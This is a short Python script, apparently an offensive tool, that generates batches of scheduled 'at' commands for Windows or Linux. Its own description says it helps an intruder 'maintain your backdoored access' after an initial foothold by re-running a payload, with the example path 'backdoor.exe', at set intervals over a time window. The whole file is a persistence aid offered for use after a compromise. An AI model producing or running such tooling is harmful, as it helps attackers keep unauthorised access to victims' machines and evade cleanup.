#!/usr/bin/env python3
from argparse import ArgumentParser

LINUX_OS_NAME = 'linux'
WINDOWS_OS_NAME = 'windows'


def get_arguments():
    parser = ArgumentParser(
        description="When an initial foothold is established, it's good to have a lot of scheduled tasks of "
                    "getting your shell back. "
                    "Old versions of Windows don't have schtasks.exe utility, but they have AT utility. "
                    "As well as Linux distributions should have AT utility installed on their systems. "
                    "This software may help you to maintain your backdoored access.")
    parser.add_argument('--time',
                        dest='time',
                        required=True,
                        help='Time span to use while generating AT statements, in the following format: 01:45-22:30')
    parser.add_argument('--period',
                        dest='period',
                        required=True,
                        help='Time period to use, in the following format: 10min')
    parser.add_argument('--cmd',
                        dest='cmd',
                        required=True,
                        help='Command to use in generated AT statements, in the following format: '
                             '"C:\\WINDOWS\\system32\\backdoor.exe"')
    parser.add_argument('--platform',
                        dest='platform',
                        choices=[LINUX_OS_NAME, WINDOWS_OS_NAME],
                        required=True,
                        help='A platform of scheduled manager to generate commands for.')
    options = parser.parse_args()
    return options


def line(h, m, path, platform):
    if platform == WINDOWS_OS_NAME:
        return f"at {h:02d}:{m:02d} \"{path}\""
    if platform == LINUX_OS_NAME:
        return f"at {h:02d}:{m:02d} -f \"{path}\""


def generate_list(timespan: str, period: str, path: str, platform):
    start, end = timespan.split('-')
    start_h, start_min = [int(i) for i in start.split(':')]
    end_h, end_min = [int(i) for i in end.split(':')]

    if end_h * 100 + end_min <= start_h * 100 + start_min:
        end_h += 24

    period_value = int(''.join([c for c in period if c.isdigit()]))
    period_measurement = ''.join([c for c in period if c.isalpha()]).lower()
    if period_measurement == 'min':
        period = 1, period_value
    elif period_measurement == 'h':
        period = period_value, 0

    first_time = True
    for timestamp_h in range(start_h, end_h + 1, period[0]):
        _end_h = end_h
        if timestamp_h >= 24:
            timestamp_h -= 24
            _end_h -= 24

        if period[1]:
            _start_min = start_min if first_time else 0
            _end_min = end_min if timestamp_h == _end_h else 60

            for timestamp_min in range(_start_min, _end_min, period[1]):
                yield line(timestamp_h, timestamp_min, path, platform)
        else:
            yield line(timestamp_h, start_min, path, platform)
        first_time = False


if __name__ == "__main__":
    options = get_arguments()
    timespan, period, path = options.time, options.period, options.cmd
    data = '\n'.join(generate_list(timespan, period, path, options.platform))
    print(data)
